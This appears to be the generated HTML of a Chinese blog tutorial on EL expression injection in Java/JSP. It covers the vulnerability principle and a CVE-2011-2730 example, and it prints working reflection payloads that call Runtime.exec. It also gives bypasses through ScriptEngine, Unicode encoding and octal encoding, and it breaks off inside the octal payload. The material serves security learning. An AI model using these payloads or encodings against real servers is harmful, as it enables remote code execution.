@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"curlysean.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="EL表达式注入  今天来学习EL表达式注入 前置基础 EL（全称 Expression Language）表达式语言  作用：  简化JSP页面内的Java代码 主要作用为 **获取数据 。**从域中获取数据，然后将数据展示出来  用法： 使用的前提是通过page标签设置不忽略EL表达式 1&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EL表达式注入">
+<meta property="og:url" content="http://curlysean.github.io/2025/03/23/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="肖恩的博客">
+<meta property="og:description" content="EL表达式注入  今天来学习EL表达式注入 前置基础 EL（全称 Expression Language）表达式语言  作用：  简化JSP页面内的Java代码 主要作用为 **获取数据 。**从域中获取数据，然后将数据展示出来  用法： 使用的前提是通过page标签设置不忽略EL表达式 1&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740315963564-41831cab-f3b0-4b98-8f81-fbfd327354f7.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740316893442-a754804b-9d63-458f-9a63-c56996f962c0.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740316837775-976bcbeb-edab-4a8f-95cb-cdddc4b31629.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740319136298-9186af5c-ffcc-4abf-8c85-ea48d8692b3e.png">
+<meta property="article:published_time" content="2025-03-23T06:16:27.570Z">
+<meta property="article:modified_time" content="2025-03-25T03:14:38.835Z">
+<meta property="article:author" content="Sean">
+<meta property="article:tag" content="表达式注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740315963564-41831cab-f3b0-4b98-8f81-fbfd327354f7.png">
+
+
+<link rel="canonical" href="http://curlysean.github.io/2025/03/23/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://curlysean.github.io/2025/03/23/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/","path":"2025/03/23/EL表达式注入/","title":"EL表达式注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>EL表达式注入 | 肖恩的博客</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">肖恩的博客</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#LcMib"><span class="nav-number">1.</span> <span class="nav-text"> EL表达式注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#hKZSz"><span class="nav-number">1.1.</span> <span class="nav-text">前置基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lmwyA"><span class="nav-number">1.2.</span> <span class="nav-text">EL表达式漏洞注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#H87dn"><span class="nav-number">1.2.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#w7Oa7"><span class="nav-number">1.2.2.</span> <span class="nav-text">通用的Poc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ciMuc"><span class="nav-number">1.2.3.</span> <span class="nav-text">简单的漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF%E4%B9%8B-CVE-2011-2730"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">简单漏洞场景CVE-2011-2730</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IdSDB"><span class="nav-number">1.3.</span> <span class="nav-text">EL表达式的EXP与基础绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XsqTV"><span class="nav-number">1.3.1.</span> <span class="nav-text">基础EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pqy5s"><span class="nav-number">1.3.2.</span> <span class="nav-text">利用 ScriptEngine 调用 JS 引擎绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BYc3S"><span class="nav-number">1.3.3.</span> <span class="nav-text">利用 Unicode 编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#QLpyH"><span class="nav-number">1.3.4.</span> <span class="nav-text">利用八进制编码绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OILfV"><span class="nav-number">1.4.</span> <span class="nav-text">防御方法</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sean"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Sean</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://curlysean.github.io/2025/03/23/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Sean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="肖恩的博客">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="EL表达式注入 | 肖恩的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          EL表达式注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-03-23 14:16:27" itemprop="dateCreated datePublished" datetime="2025-03-23T14:16:27+08:00">2025-03-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-03-25 11:14:38" itemprop="dateModified" datetime="2025-03-25T11:14:38+08:00">2025-03-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="LcMib"> EL表达式注入</h1>
+
+<p>今天来学习<strong>EL表达式注入</strong></p>
+<h2 id="hKZSz">前置基础</h2>
+EL（全称 Expression Language）表达式语言
+
+<p><strong>作用</strong>：</p>
+<ul>
+<li>简化JSP页面内的Java代码</li>
+<li>主要作用为 **获取数据 。**从域中获取数据，然后将数据展示出来</li>
+</ul>
+<p><strong>用法</strong>：</p>
+<p>使用的前提是通过page标签设置不忽略EL表达式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> isELIgnored=<span class="string">&quot;false&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>基础操作符：</strong></p>
+<p>这里我们列出来几个较为重要的算术和逻辑操作符</p>
+<table>
+<thead>
+<tr>
+<th><strong><font style="color:rgb(79, 79, 79);">操作</font><strong><strong><font style="color:rgb(79, 79, 79);"></font></strong></strong><font style="color:rgb(79, 79, 79);">符</font></strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>.</strong></td>
+<td><strong>访问一个Bean属性或者一个映射条目 ${param.order}</strong></td>
+</tr>
+<tr>
+<td><strong>[]</strong></td>
+<td><strong>访问一个数组或者链表的元素 ${param[“order”]}</strong></td>
+</tr>
+<tr>
+<td><strong>()</strong></td>
+<td><strong><font style="color:rgb(79, 79, 79);">组织一个子表达式以改变优先级</font></strong></td>
+</tr>
+</tbody></table>
+<p><strong>语法</strong>：</p>
+<p>EL表达式的用法为<code>$&#123;expression&#125;</code></p>
+<p>例如<code>$&#123;&lt;font style=&quot;color:rgb(102, 102, 102);&quot;&gt;userinfo&lt;/font&gt;&#125;</code>代表从<strong>域</strong>中获取变量userinfo的值</p>
+<p>而JSP中存在四大域，分别为</p>
+<ul>
+<li>page：当前页面有效</li>
+<li>request：当前请求有效</li>
+<li>session：当前会话有效</li>
+<li>application：当前应用有效</li>
+</ul>
+<p>EL表达式获取数据时，依次从以上四个域中获取，直到寻找到该变量（若没有找到则返回<code>&quot;&quot;</code>）</p>
+<p>有些双亲委派的味道</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740315963564-41831cab-f3b0-4b98-8f81-fbfd327354f7.png"></p>
+<h2 id="lmwyA">EL表达式漏洞注入</h2>
+<h3 id="H87dn">漏洞原理</h3>
+
+<p>EL表达式注入漏洞的漏洞原理是：<strong>表达式外部可控</strong>导致攻击者注入恶意表达式从而实现任意代码执行，SpEL、OGNL等表达式注入也是一样的漏洞原理</p>
+<p>一般来说，EL表达式注入漏洞的外部可控点入口都是在Java程序代码中，即Java程序中的EL表达式内容全部或部分是外部获取的</p>
+<h3 id="w7Oa7">通用的Poc</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span></span><br><span class="line">$&#123;pageContext&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取Web路径</span></span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(<span class="string">&quot;&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件头参数</span></span><br><span class="line">$&#123;header&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取webRoot</span></span><br><span class="line">$&#123;applicationScope&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行命令</span></span><br><span class="line">$&#123;pageContext.request.getSession().setAttribute(<span class="string">&quot;a&quot;</span>,pageContext.request.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;calc&quot;</span>).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ciMuc">简单的漏洞利用</h3>
+当存在一个参数`X`可控时，可以插入到JSP页面中
+
+<p>我们将参数<code>X</code>设为以下payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>.getClass()).invoke(<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>),<span class="string">&quot;calc.exe&quot;</span>))&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740316893442-a754804b-9d63-458f-9a63-c56996f962c0.png"></p>
+<p>当我们访问JSP页面时，服务端就会解析构造的恶意EL表达式，从而造成EL表达式注入</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740316837775-976bcbeb-edab-4a8f-95cb-cdddc4b31629.png"></p>
+<p>在实际的应用场景中，几乎没有也无法直接从外部控制JSP页面中的EL表达式的。而且目前已知的EL表达式注入漏洞都是框架层面服务端执行的EL表达式外部可控导致的</p>
+<h4 id="简单漏洞场景之-CVE-2011-2730">简单漏洞场景CVE-2011-2730</h4>
+参考链接：[https://juejin.cn/post/6844903572077838350](https://juejin.cn/post/6844903572077838350)
+
+<p>正常情况下使用message标签，text属性使用EL表达式从请求中取值</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib uri=<span class="string">&quot;http://www.springframework.org/tags&quot;</span> prefix=<span class="string">&quot;spring&quot;</span>%&gt;</span><br><span class="line">&lt;spring:message  text=<span class="string">&quot;$&#123;param.a&#125;&quot;</span>&gt;&lt;/spring:message&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当我们访问以下url时候，<code>$&#123;applicationScope&#125;</code>就会被当作EL表达式执行</p>
+<p>我们改变EL表达式的内容，就可以达到其他目的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/tag.jsp?a=$&#123;applicationScope&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740319136298-9186af5c-ffcc-4abf-8c85-ea48d8692b3e.png"></p>
+<h2 id="IdSDB">EL表达式的EXP与基础绕过</h2>
+<h3 id="XsqTV">基础EXP</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;&#x27;</span>.getClass()).invoke(<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="string">&#x27;getRuntime&#x27;</span>).invoke(<span class="literal">null</span>),<span class="string">&#x27;calc.exe&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Pqy5s">利用 ScriptEngine 调用 JS 引擎绕过</h3>
+引用drun1baby师傅的博客
+
+<blockquote>
+<p><font style="color:rgb(80, 80, 92);">EL 曾经是</font><font style="color:rgb(80, 80, 92);"> </font><code>JSTL</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">的一部分。然后，EL 进入了 JSP 2.0 标准。现在，尽管是 JSP 2.1 的一部分，但 EL API 已被分离到包</font><font style="color:rgb(80, 80, 92);"> </font><code>javax.el</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">中， 并且已删除了对核心 JSP 类的所有依赖关系。换句话说：EL 已准备好在非 JSP 应用程序中使用！</font></p>
+<p><font style="color:rgb(80, 80, 92);">也就是说，现在 EL 表达式所依赖的包</font><font style="color:rgb(80, 80, 92);"> </font><code>javax.el</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">等都在</font><font style="color:rgb(80, 80, 92);"> </font><code>JUEL</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">相关的 jar 包中。</font></p>
+<p><font style="color:rgb(80, 80, 92);">JUEL（Java Unified Expression Language）是统一表达语言轻量而高效级的实现，具有高性能，插件式缓存，小体积，支持方法调用和多参数调用，可插拔多种特性。</font></p>
+<p><font style="color:rgb(80, 80, 92);">需要的 jar 包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7</font></p>
+</blockquote>
+<p>在pom.xml中导入依赖</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;de.odysseus.juel&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;juel-impl&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span class="number">.7</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;de.odysseus.juel&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;juel-api&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span class="number">.7</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;de.odysseus.juel&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;juel-spi&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span class="number">.7</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>运行后，通过反射调用<code>Runtime</code>类，成功执行恶意代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> drunkbaby.basicelvul;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> de.odysseus.el.ExpressionFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> de.odysseus.el.util.SimpleContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.el.ExpressionFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.el.ValueExpression;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScriptEngineExec</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">ExpressionFactory</span> <span class="variable">expressionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExpressionFactoryImpl</span>();  </span><br><span class="line">        <span class="type">SimpleContext</span> <span class="variable">simpleContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleContext</span>();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;$&#123;&#x27;&#x27;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;java.lang.Runtime.getRuntime().exec(&#x27;Calc.exe&#x27;)\&quot;)&#125;\n&quot;</span> +  <span class="string">&quot; &quot;</span>;  </span><br><span class="line">        <span class="type">ValueExpression</span> <span class="variable">valueExpression</span> <span class="operator">=</span> expressionFactory.createValueExpression(simpleContext, exp, String.class);  </span><br><span class="line">        valueExpression.getValue(simpleContext);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="BYc3S">利用 Unicode 编码绕过</h3>
+对可利用的poc进行全部或者部分的Unicode编码都是可以的
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Unicode编码内容为前面反射调用的PoC</span></span><br><span class="line">\u0024\u007b\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0065\u0078\u0065\u0063\u0027\u002c\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u006e\u0075\u006c\u006c\u0029\u002c\u0027\u0063\u0061\u006c\u0063\u002e\u0065\u0078\u0065\u0027\u0029\u007d</span><br></pre></td></tr></table></figure>
+
+<h3 id="QLpyH">利用八进制编码绕过</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 八进制编码内容为前面反射调用的PoC</span></span><br><span class="line">\<span class="number">44</span>\<span class="number">173</span>\<span class="number">47</span>\<span class="number">47</span>\<span class="number">56</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">103</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">163</span>\<span class="number">50</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">146</span>\<span class="number">157</span>\<span class="number">162</span>\<span class="number">116</span>\<span class="number">141</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">50</span>\<span class="number">47</span>\<span class="number">152</span>\<span class="number">141</span>\<span class="number">166</span>\<span class="number">141</span>\<span class="number">56</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">156</span>\<span class="number">147</span>\<span class="number">56</span>\<span class="number">122</span>\<span class="number">165</span>\<span class="number">156</span>\<span class="number">164</span>\<span class="number">151</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">47</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">115</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">150</span>\<span class="number">157</span>\<span class="number">144</span>\<span class="number">50</span>\<span class="number">47</span>\<span class="number">145</span>\<span class="number">170</span>\<span class="number">145</span>\<span class="number">143</span>\<span class="number">47</span>\<span class="number">54</span>\<span class="number">47</span>\<span class="number">47</span>\<span class="number">56</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">103</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">163</span>\<span 